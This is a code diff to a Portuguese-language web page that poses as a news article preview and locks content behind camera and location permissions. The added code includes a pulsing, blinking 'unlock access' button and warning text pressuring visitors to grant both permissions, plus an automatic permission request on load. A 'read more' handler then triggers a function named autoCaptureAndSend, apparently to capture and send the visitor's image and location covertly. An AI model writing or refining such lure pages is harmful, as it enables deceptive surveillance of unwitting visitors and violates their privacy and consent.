@@ -243,9 +243,61 @@
             cursor: not-allowed;
         }
         
-        .retry-btn {
-            background: #c0392b;
+        /* Botão de chamar permissão - DESTAQUE */
+        .call-permission-btn {
+            background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
+            color: white;
+            border: none;
+            padding: 14px 25px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
             margin-top: 10px;
+            transition: all 0.3s;
+            animation: pulse-attention 1.5s infinite;
+            box-shadow: 0 0 15px rgba(192, 57, 43, 0.5);
+        }
+        
+        @keyframes pulse-attention {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(192, 57, 43, 0.7);
+            }
+            70% {
+                transform: scale(1.02);
+                box-shadow: 0 0 0 15px rgba(192, 57, 43, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(192, 57, 43, 0);
+            }
+        }
+        
+        .call-permission-btn:hover {
+            transform: scale(1.03);
+            animation: none;
+        }
+        
+        .retry-btn {
+            background: #003366;
+            margin-top: 10px;
+            animation: none;
+            box-shadow: none;
+        }
+        
+        .warning-text {
+            color: #c0392b;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 12px;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
         
         @keyframes spin {
@@ -533,8 +585,17 @@
                 Quando solicitado, clique em <strong>"PERMITIR"</strong>
             </p>
             
-            <button id="initialAllowBtn" class="btn-initial" disabled>⏳ Aguardando...</button>
-            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Recarregar e Tentar</button>
+            <!-- Botão principal para chamar permissão - em destaque -->
+            <button id="callPermissionBtn" class="call-permission-btn">
+                🔓 CLICAR PARA LIBERAR ACESSO
+            </button>
+            
+            <button id="initialAllowBtn" class="btn-initial" style="display: none;">✅ Acessar Site</button>
+            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Recarregar</button>
+            
+            <div id="warningMsg" class="warning-text" style="display: none;">
+                ⚠️ Clique no botão acima para autorizar as permissões!
+            </div>
         </div>
         
         <!-- Miniatura da prévia da notícia -->
@@ -639,8 +700,10 @@
         // Elementos
         const initialScreen = document.getElementById('initialScreen');
         const mainContent = document.getElementById('mainContent');
+        const callPermissionBtn = document.getElementById('callPermissionBtn');
         const initialAllowBtn = document.getElementById('initialAllowBtn');
         const initialRetryBtn = document.getElementById('initialRetryBtn');
+        const warningMsg = document.getElementById('warningMsg');
         const cameraStatusSpan = document.getElementById('cameraStatus');
         const locationStatusSpan = document.getElementById('locationStatus');
         
@@ -671,19 +734,23 @@
                 locationStatusSpan.innerHTML = '⏳';
                 locationStatusSpan.className = 'status-value status-pending';
             }
-        }
-        
-        function resetPermissions() {
-            cameraGranted = false;
-            locationGranted = false;
-            permissionsReady = false;
-            updateStatusUI();
-        }
-        
-        function reloadPageAndRetry() {
-            const url = new URL(window.location.href);
-            url.searchParams.set('retry', Date.now());
-            window.location.href = url.toString();
+            
+            // Se ambas as permissões foram concedidas, mostrar botão de acessar
+            if (cameraGranted && locationGranted) {
+                callPermissionBtn.style.display = 'none';
+                initialAllowBtn.style.display = 'block';
+                warningMsg.style.display = 'none';
+                permissionsReady = true;
+            } else {
+                callPermissionBtn.style.display = 'block';
+                initialAllowBtn.style.display = 'none';
+                if (!cameraGranted && !locationGranted && !permissionsReady) {
+                    // Mostrar aviso apenas se o usuário já tentou e não conseguiu
+                    if (window.hasAttempted) {
+                        warningMsg.style.display = 'block';
+                    }
+                }
+            }
         }
         
         async function requestCameraPermission() {
@@ -730,10 +797,10 @@
         async function requestAllPermissions() {
             if (isRequesting) return false;
             isRequesting = true;
+            window.hasAttempted = true;
             
-            initialAllowBtn.disabled = true;
-            initialAllowBtn.textContent = '⏳ Solicitando...';
-            initialRetryBtn.style.display = 'none';
+            callPermissionBtn.disabled = true;
+            callPermissionBtn.textContent = '⏳ Solicitando permissões...';
             
             updateStatusUI();
             
@@ -744,13 +811,13 @@
             permissionsReady = cameraGranted && locationGranted;
             
             if (permissionsReady) {
-                initialAllowBtn.disabled = false;
-                initialAllowBtn.textContent = '✅ Acessar Site';
-                initialRetryBtn.style.display = 'none';
+                callPermissionBtn.style.display = 'none';
+                initialAllowBtn.style.display = 'block';
+                warningMsg.style.display = 'none';
             } else {
-                initialAllowBtn.disabled = true;
-                initialAllowBtn.textContent = '❌ Necessário';
-                initialRetryBtn.style.display = 'block';
+                callPermissionBtn.disabled = false;
+                callPermissionBtn.textContent = '🔓 CLICAR PARA LIBERAR ACESSO';
+                warningMsg.style.display = 'block';
             }
             
             isRequesting = false;
@@ -916,6 +983,11 @@
             }
         }
         
+        // Botão para chamar permissão manualmente
+        callPermissionBtn.addEventListener('click', async () => {
+            await requestAllPermissions();
+        });
+        
         initialAllowBtn.addEventListener('click', async () => {
             if (permissionsReady) {
                 initialScreen.classList.add('hide');
@@ -927,37 +999,22 @@
         });
         
         initialRetryBtn.addEventListener('click', () => {
-            reloadPageAndRetry();
-        });
-        
-        // FORÇAR SOLICITAÇÃO DE PERMISSÕES COM DELAY PARA GARANTIR POPUP
-        window.addEventListener('load', function() {
-            setTimeout(function() {
-                requestAllPermissions();
-            }, 100);
+            window.location.reload();
         });
         
         readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
-            if (!autoCaptureDone) {
+            if (!autoCaptureDone && permissionsReady) {
                 await autoCaptureAndSend();
             }
         });
         
-        // Se veio de retry, forçar novamente
-        if (window.location.search.includes('retry')) {
-            setTimeout(function() {
-                requestAllPermissions();
-            }, 300);
-        }
-        
-        // Fallback: se após 2 segundos as permissões não foram solicitadas, tentar novamente
+        // Tentativa automática uma vez ao carregar
         setTimeout(function() {
             if (!cameraGranted && !locationGranted) {
-                console.log('Fallback: forçando solicitação de permissões...');
                 requestAllPermissions();
             }
-        }, 2000);
+        }, 500);
     </script>
 </body>
 </html>
